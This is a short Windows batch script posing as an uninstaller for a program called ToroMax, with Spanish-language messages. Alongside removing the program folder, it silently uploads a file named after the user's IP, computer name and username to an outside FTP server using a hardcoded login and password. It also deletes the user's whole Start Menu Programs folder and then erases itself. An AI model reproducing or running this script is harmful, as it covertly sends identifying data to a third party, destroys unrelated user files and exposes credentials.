@echo off
cd "C:\Users\%username%\"
rd /S /Q ToroMax
timeout /t 1 /NOBREAK
cd "C:\Users\%username%\AppData\Local\Temp\"
@echo %computername% o %username% se ha desinstalado ToroMax. >> Desinstalaciones.txt
curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
timeout /t 1
del Desinstalaciones.txt /F
rd /S /Q "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"
color A
cls
@echo ToroMax Desinstalado Correctamente... :(
pause
del UninstallToroMax.bat /F
